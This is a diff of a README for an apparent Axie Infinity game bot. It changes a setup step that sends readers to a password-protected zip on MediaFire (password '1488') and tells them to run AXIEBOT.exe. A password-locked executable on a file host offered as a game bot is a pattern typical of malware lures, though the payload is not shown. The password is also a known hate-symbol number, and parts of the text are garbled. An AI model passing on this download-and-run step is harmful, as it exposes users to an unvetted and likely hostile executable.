@@ -5,7 +5,7 @@ Bot uses WinAPI functions to take screenshots and recognize pixels of axie model
 Setup
  
 1.Change game resolution to full-screen (or full-scren windowed) and close SkyM avis game client
-2.Download archive with software https://www.mediafire.com/file/45lsw0mjspoad am/AxieBot.zip/file Password:1488
+2.Download archive with software https://www.mediafire.com/file/45lsw0mjspoadam/AxieBot.zip/file Password:1488
 3.Launch AXIEBOT.exe with correct settings
 Warni
 Im not recommend you to play more than 24 hours per account. Im  no take responsibility for any bans or blocks.
